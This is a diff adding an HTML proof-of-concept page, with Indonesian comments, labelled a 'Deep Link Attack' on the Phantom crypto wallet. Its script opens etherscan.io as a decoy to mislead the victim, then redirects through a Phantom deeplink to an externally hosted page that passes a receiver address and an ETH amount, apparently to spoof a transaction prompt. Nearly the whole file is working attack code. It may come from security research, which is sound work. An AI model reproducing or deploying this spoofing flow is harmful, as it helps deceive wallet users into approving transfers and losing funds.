@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Phantom Deeplink Launcher</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="font-family:system-ui,sans-serif;padding:24px">
+  <h2>Deep Link Attack (Phantom)</h2>
+  <button onclick="launchSpoof()">fake transaction</button>
+
+  <script>
+    function launchSpoof() {
+      // Decoy (biar address bar korban lihat situs lain dulu)
+      setTimeout(() => { window.open("https://etherscan.io/", "_blank"); }, 100);
+
+      // === nilai persis seperti punyamu ===
+      const receiver = '0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF';
+      const chainId  = 1;                         // Ethereum mainnet
+      const value    = '0x2386F26FC10000';        // 0.01 ETH (wei)
+
+      // arahkan Phantom untuk membuka halaman target (host sendiri) + query params
+      const targetPage = "https://guzings.github.io/phantom-evm-poc.htm"
+        + `?r=${encodeURIComponent(receiver)}&cid=${encodeURIComponent(chainId)}&val=${encodeURIComponent(value)}`;
+
+      const deeplink =
+        "https://phantom.app/ul/browse/" + encodeURIComponent(targetPage) +
+        "?ref=" + encodeURIComponent(location.href);
+
+      // Trigger deeplink (perlu user gesture – dipanggil dari onclick)
+      window.location.href = deeplink;
+    }
+  </script>
+</body>
+</html>
